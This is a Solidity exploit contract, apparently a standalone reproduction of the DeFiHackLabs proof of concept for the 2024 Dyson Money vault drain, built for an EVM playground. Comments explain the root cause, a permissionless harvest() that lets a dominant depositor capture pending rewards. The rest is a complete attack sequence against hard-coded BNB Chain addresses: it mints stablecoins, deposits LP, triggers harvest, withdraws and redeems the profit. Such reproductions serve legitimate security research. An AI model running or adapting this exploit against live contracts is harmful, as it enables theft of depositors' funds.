// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2024-06-Dyson_money).
// The DeFiHackLabs PoC runs the whole attack INLINE in the Foundry test contract
// (attacker == address(this); no standalone exploit contract is deployed), so this
// contract is a faithful, self-contained copy of that inline attack (attack() +
// approveAll()) so the playground can deploy it and record run(). Logic and
// constants are copied verbatim from test/Dyson_money_exp.sol.
//
// Root cause: DysonVault mints/redeems shares against balance() = LP held by its
// strategy, and the strategy's harvest() is fully permissionless and dumps ALL
// pending DYS reward value into `want` LP in one shot with no new shares minted.
// Because the vault held only dust LP at the fork block, a tiny deposit made the
// attacker the ~99.95% dominant shareholder; calling harvest() then injected
// ~$33k of reward value into balance(), which withdrawAll() paid out pro-rata.

interface IERC20 {
    function approve(address spender, uint256 value) external returns (bool);
    function transfer(address to, uint256 value) external returns (bool);
    function balanceOf(address owner) external view returns (uint256);
}

interface Vulncontract is IERC20 {
    struct MintParams {
        address asset; // USDC | USDT depending on minter
        uint256 amount; // amount of asset
        string referral; // referral code, empty if none
    }

    function mint(MintParams calldata params) external returns (uint256);
    function harvest() external;
    function redeem(address _asset, uint256 _amount) external returns (uint256);
}

interface StableV1AMM is IERC20 {
    function mint(address to) external returns (uint256 liquidity);
    function burn(address to) external returns (uint256 amount0, uint256 amount1);
}

interface DysonVault is IERC20 {
    function depositAll() external;
    function withdrawAll() external;
}

contract DysonMoneyDrain {
    // Overnight Exchange minters (USDT<->USDPlus, USDC<->USD+).
    Vulncontract constant b708 = Vulncontract(0xd3F827C0b1D224aeBCD69c449602bBCb427Cb708);
    Vulncontract constant b821 = Vulncontract(0x5A8EEe279096052588DfCc4e8b466180490DB821);
    // Vulnerable strategy proxy (permissionless harvest()).
    Vulncontract constant b29b = Vulncontract(0x2b9BDa587ee04fe51C5431709afbafB295F94bB4);

    IERC20 constant USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 constant USDC = IERC20(0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d);
    // NOTE: naming mirrors the original test verbatim (Usdt == USDPlus token; USDPLUS == USD+ token).
    IERC20 constant Usdt = IERC20(0x5335E87930b410b8C5BB4D43c3360ACa15ec0C8C);
    IERC20 constant USDPLUS = IERC20(0xe80772Eaf6e2E18B651F160Bc9158b2A5caFCA65);

    StableV1AMM constant StableV1 = StableV1AMM(0x1561D9618dB2Dcfe954f5D51f4381fa99C8E5689);
    DysonVault constant dysonVault = DysonVault(0x2836B64a39d5B73d8f534c9fd6c6ABD81df2beB7);

    // Entry point recorded by the playground. Mirrors ContractTest.attack().
    function run() external {
        approveAll();

        Vulncontract.MintParams memory paramsUsdc =
            Vulncontract.MintParams({asset: address(USDC), amount: 901 ether, referral: "test"});
        b821.mint(paramsUsdc);

        Vulncontract.MintParams memory paramsUsdt =
            Vulncontract.MintParams({asset: address(USDT), amount: 901 ether, referral: "test"});
        b708.mint(paramsUsdt);

        Usdt.transfer(address(StableV1), 748 ether);
        USDPLUS.transfer(address(StableV1), 900_639_600);

        StableV1.mint(address(this));
        dysonVault.depositAll();

        // The exploit: fully permissionless harvest() dumps ~87.8k pending DYS
        // rewards into `want` LP without minting any new vault shares.
        b29b.harvest();

        dysonVault.withdrawAll();

        uint256 amounts = StableV1.balanceOf(address(this));
        StableV1.transfer(address(StableV1), amounts);
        StableV1.burn(address(this));

        b708.redeem(address(USDT), 15_000 ether);
        b821.redeem(address(USDC), 18_000 * 1e6);
    }

    function approveAll() internal {
        USDT.approve(address(b708), type(uint256).max);
        Usdt.approve(address(b708), type(uint256).max);
        USDC.approve(address(b821), type(uint256).max);
        USDPLUS.approve(address(b821), type(uint256).max);
        StableV1.approve(address(dysonVault), type(uint256).max);
    }
}
